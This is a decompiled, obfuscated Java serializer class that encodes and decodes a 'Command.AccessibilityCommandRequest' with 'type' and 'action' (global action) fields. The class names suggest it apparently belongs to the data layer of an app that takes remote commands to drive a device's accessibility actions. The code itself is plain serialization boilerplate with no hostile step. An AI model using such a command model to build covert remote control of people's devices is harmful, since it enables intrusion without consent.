package com.hawkshaw.library.datalayer.models;

import B3.m;
import D3.a;
import D3.b;
import E3.C0029h0;
import E3.H;
import E3.q0;
import Y1.K;
import com.hawkshaw.library.datalayer.models.Command;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import kotlinx.serialization.encoding.Decoder;
import kotlinx.serialization.encoding.Encoder;
import kotlinx.serialization.internal.PluginGeneratedSerialDescriptor;
import w3.w;

public final class Command$AccessibilityCommandRequest$$serializer implements H {
    public static final Command$AccessibilityCommandRequest$$serializer INSTANCE;
    private static final /* synthetic */ PluginGeneratedSerialDescriptor descriptor;

    static {
        Command$AccessibilityCommandRequest$$serializer command$AccessibilityCommandRequest$$serializer = new Command$AccessibilityCommandRequest$$serializer();
        INSTANCE = command$AccessibilityCommandRequest$$serializer;
        PluginGeneratedSerialDescriptor pluginGeneratedSerialDescriptor = new PluginGeneratedSerialDescriptor("com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest", command$AccessibilityCommandRequest$$serializer, 2);
        pluginGeneratedSerialDescriptor.l("type", false);
        pluginGeneratedSerialDescriptor.l("action", true);
        descriptor = pluginGeneratedSerialDescriptor;
    }

    private Command$AccessibilityCommandRequest$$serializer() {
    }

    public KSerializer[] childSerializers() {
        KSerializer[] access$get$childSerializers$cp = Command.AccessibilityCommandRequest.$childSerializers;
        return new KSerializer[]{access$get$childSerializers$cp[0], w.n(access$get$childSerializers$cp[1])};
    }

    public Command.AccessibilityCommandRequest deserialize(Decoder decoder) {
        K.n(decoder, "decoder");
        SerialDescriptor descriptor2 = getDescriptor();
        a a5 = decoder.a(descriptor2);
        KSerializer[] access$get$childSerializers$cp = Command.AccessibilityCommandRequest.$childSerializers;
        boolean z4 = true;
        int i5 = 0;
        Command.AccessibilityCommandRequest.Type type = null;
        Command.AccessibilityCommandRequest.GlobalAction globalAction = null;
        while (z4) {
            int y4 = a5.y(descriptor2);
            if (y4 == -1) {
                z4 = false;
            } else if (y4 == 0) {
                type = (Command.AccessibilityCommandRequest.Type) a5.l(descriptor2, 0, access$get$childSerializers$cp[0], type);
                i5 |= 1;
            } else if (y4 == 1) {
                globalAction = (Command.AccessibilityCommandRequest.GlobalAction) a5.f(descriptor2, 1, access$get$childSerializers$cp[1], globalAction);
                i5 |= 2;
            } else {
                throw new m(y4);
            }
        }
        a5.c(descriptor2);
        return new Command.AccessibilityCommandRequest(i5, type, globalAction, (q0) null);
    }

    public SerialDescriptor getDescriptor() {
        return descriptor;
    }

    public void serialize(Encoder encoder, Command.AccessibilityCommandRequest accessibilityCommandRequest) {
        K.n(encoder, "encoder");
        K.n(accessibilityCommandRequest, "value");
        SerialDescriptor descriptor2 = getDescriptor();
        b a5 = encoder.a(descriptor2);
        Command.AccessibilityCommandRequest.write$Self$library_release(accessibilityCommandRequest, a5, descriptor2);
        a5.c(descriptor2);
    }

    public KSerializer[] typeParametersSerializers() {
        return C0029h0.f501b;
    }
}
